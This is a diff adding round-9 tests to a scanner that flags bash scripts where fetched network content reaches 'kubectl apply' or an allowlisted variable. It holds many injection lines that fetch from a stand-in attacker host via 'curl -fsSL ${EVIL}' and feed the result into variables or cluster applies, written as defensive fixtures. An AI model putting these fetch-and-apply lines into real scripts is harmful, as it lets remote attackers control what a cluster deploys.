@@ -790,6 +790,139 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     expect(unsafeApplies(`${STRICT}N=HOME\ncat <<E | kubectl apply -f -\n\${!N}\nE\n`)).toEqual([]);
   });
 
+  // ---- #1410 round 9: EVERY way of writing an interpolated variable is traced or opaque --
+  //
+  // Round 8 followed only `NAME=value` writes; any other writer was dropped without a
+  // trace, so `read -r STATIC_LSN < <(curl …)` next to an allowlisted statement stayed
+  // green. The scanner now finds write sites by SCANNING every occurrence of the name
+  // (a `$`-read or a modeled leading `NAME=` is the only non-write), so each line below
+  // — inserted into the real allowlisted file, statement untouched — must red it.
+
+  const R9_OBJSTORE_ANCHOR = '[ -n "$STATIC_LSN" ] || fail "could not read restored LSN"\n';
+  const R9_RESTORE_ANCHOR =
+    '[ -n "$STATIC_LSN" ] || fail "could not read restored pageserver LSN"\n';
+  const R9_WRITERS: Record<string, string> = {
+    'read < <(…)': `read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'read <<< "$(…)"': `read -r STATIC_LSN <<< "$(curl -fsSL ${EVIL})"`,
+    'read -d ""': `IFS= read -r -d "" STATIC_LSN < <(curl -fsSL ${EVIL}) || true`,
+    'read of a quoted name': `read -r "STATIC_LSN" < <(curl -fsSL ${EVIL})`,
+    'read from an in-cluster fetch': `read -r STATIC_LSN < <($KD exec sts/pageserver -- curl -s http://localhost:9898/v1/other)`,
+    'read from a pipe (while)': `curl -fsSL ${EVIL} | while read -r STATIC_LSN; do :; done`,
+    'while read … done < <(…)': `while read -r STATIC_LSN; do break; done < <(curl -fsSL ${EVIL})`,
+    'read -a': `read -r -a STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'printf -v': `printf -v STATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
+    'printf -vNAME (attached)': `printf -vSTATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
+    mapfile: `mapfile -t STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    readarray: `readarray -t STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'coproc + read': `coproc C { curl -fsSL ${EVIL}; }; read -r STATIC_LSN <&"\${C[0]}"`,
+    'coproc NAME': `coproc STATIC_LSN { curl -fsSL ${EVIL}; }`,
+    '${V:=…}': `: "\${STATIC_LSN:=$(curl -fsSL ${EVIL})}"`,
+    '${V=…}': `: "\${STATIC_LSN=$(curl -fsSL ${EVIL})}"`,
+    'for V in': `for STATIC_LSN in $(curl -fsSL ${EVIL}); do :; done`,
+    'select V in': `select STATIC_LSN in $(curl -fsSL ${EVIL}); do break; done`,
+    getopts: `getopts a: STATIC_LSN -a "$(curl -fsSL ${EVIL})"`,
+    'arr[i]= then ${arr[0]}': `arr[0]="$(curl -fsSL ${EVIL})"; STATIC_LSN="\${arr[0]}"`,
+    'arr+=(…)': `arr+=("$(curl -fsSL ${EVIL})"); STATIC_LSN="\${arr[0]}"`,
+    'V[i]=': `STATIC_LSN[0]="$(curl -fsSL ${EVIL})"`,
+    'V+=': `STATIC_LSN+="$(curl -fsSL ${EVIL})"`,
+    '$(<file) of a fetched file': `curl -fsSL -o /tmp/lsn ${EVIL}; STATIC_LSN="$(</tmp/lsn)"`,
+    'declare -n nameref': `declare -n R=STATIC_LSN; R="$(curl -fsSL ${EVIL})"`,
+    'a run-time variable name (printf -v "$n")': `n=STATIC_LSN; printf -v "$n" "%s" "$(curl -fsSL ${EVIL})"`,
+    'a run-time variable name (declare "$n=…")': `n=STATIC_LSN; declare "$n=$(curl -fsSL ${EVIL})"`,
+    'the implicit $REPLY': `read -r < <(curl -fsSL ${EVIL}); STATIC_LSN="$REPLY"`,
+    'the implicit $MAPFILE': `mapfile < <(curl -fsSL ${EVIL}); STATIC_LSN="\${MAPFILE[0]}"`,
+    let: 'let STATIC_LSN=1',
+    'arithmetic assignment': '(( STATIC_LSN = 1 ))',
+    'wait -p': 'sleep 0 & wait -p STATIC_LSN',
+    '{V}> fd binding': 'exec {STATIC_LSN}>/dev/null',
+    'a run-time command ($cmd V)': `cmd=read; $cmd -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'a write AFTER the statement (loop order)': `trap 'read -r STATIC_LSN < <(curl -fsSL ${EVIL})' EXIT`,
+  };
+
+  const r9Inject = (file: string, anchor: string, line: string, id: string) => {
+    const text = readTracked(file);
+    expect({ id, anchorOnce: text.split(anchor).length - 1 }).toEqual({ id, anchorOnce: 1 });
+    const offenders = scanFile(
+      file,
+      text.replace(anchor, () => `${anchor}${line}\n`),
+    );
+    return offenders.some((o) => o.includes(`allowlisted statement '${id}'`));
+  };
+
+  for (const [name, line] of Object.entries(R9_WRITERS)) {
+    it(`round 9: \`${name}\` writing an allowlisted statement's variable reds the source pin`, () => {
+      expect({
+        name,
+        pinned: r9Inject(
+          `${D}_verify-objstore.sh`,
+          R9_OBJSTORE_ANCHOR,
+          line,
+          'lsn-inject-objstore',
+        ),
+      }).toEqual({
+        name,
+        pinned: true,
+      });
+    });
+  }
+
+  it('round 9: `for V in $(curl …)` on the lsn-inject-restore entry reds its source pin', () => {
+    const line = `for STATIC_LSN in $(curl -fsSL ${EVIL}); do :; done`;
+    expect(r9Inject(`${D}_verify-restore.sh`, R9_RESTORE_ANCHOR, line, 'lsn-inject-restore')).toBe(
+      true,
+    );
+  });
+
+  it('round 9: an unrelated mention of the name (prose, a jq/psql argument, an arithmetic read) is not a write', () => {
+    for (const line of [
+      'info "STATIC_LSN is the restored LSN"',
+      "jq -r --arg STATIC_LSN x '.a' /dev/null >/dev/null || true",
+      `echo "$(( \${#STATIC_LSN} + 1 ))" >/dev/null`,
+      'local_note=STATIC_LSN',
+    ])
+      expect({
+        line,
+        pinned: r9Inject(
+          `${D}_verify-objstore.sh`,
+          R9_OBJSTORE_ANCHOR,
+          line,
+          'lsn-inject-objstore',
+        ),
+      }).toEqual({
+        line,
+        pinned: false,
+      });
+  });
+
+  // The general walk (no allowlist): a variable written by any construct carries the
+  // network provenance of the clause that wrote it — remote AND in-cluster fetches.
+  it('round 9: outside the allowlist, every non-`NAME=` writer carries its producer into an apply', () => {
+    const LOOP = 'kubectl exec p -- curl -s http://localhost:9898/x';
+    const cases: Record<string, Fixture> = {};
+    for (const [label, producer] of [
+      ['remote', `curl -fsSL ${EVIL}`],
+      ['in-cluster', LOOP],
+    ]) {
+      const apply = 'echo "$V" | kubectl apply -f -';
+      Object.assign(cases, {
+        [`${label} read < <()`]: `${STRICT}read -r V < <(${producer})\n${apply}\n`,
+        [`${label} read <<<`]: `${STRICT}read -r V <<< "$(${producer})"\n${apply}\n`,
+        [`${label} printf -v`]: `${STRICT}printf -v V "%s" "$(${producer})"\n${apply}\n`,
+        [`${label} mapfile`]: `${STRICT}mapfile -t V < <(${producer})\n${apply}\n`,
+        [`${label} for`]: `${STRICT}for V in $(${producer}); do :; done\n${apply}\n`,
+        [`${label} while … done <`]: `${STRICT}while read -r V; do :; done < <(${producer})\n${apply}\n`,
+        [`${label} \${V:=}`]: `${STRICT}: "\${V:=$(${producer})}"\n${apply}\n`,
+        [`${label} arr[0]=`]: `${STRICT}arr[0]="$(${producer})"\nV="\${arr[0]}"\n${apply}\n`,
+        [`${label} coproc`]: `${STRICT}coproc C { ${producer}; }\nread -r V <&"\${C[0]}"\n${apply}\n`,
+        [`${label} $REPLY`]: `${STRICT}read -r < <(${producer})\nV="$REPLY"\n${apply}\n`,
+        [`${label} printf -v "$n"`]: `${STRICT}n=V\nprintf -v "$n" "%s" "$(${producer})"\n${apply}\n`,
+        [`${label} $(<file)`]: `${STRICT}${producer} > /tmp/f\nV="$(</tmp/f)"\n${apply}\n`,
+      });
+    }
+    cases['declare -n'] = `${STRICT}declare -n R=V\necho "$R" | kubectl apply -f -\n`;
+    expectAllFlagged(cases);
+  });
+
   // ---- #1410 round 5, finding 3: pinned versions fail fast, by name --------
 
   it('round 5: the szpg drill rejects a cert-manager / Knative version override, naming the pin, before any cluster work', () => {
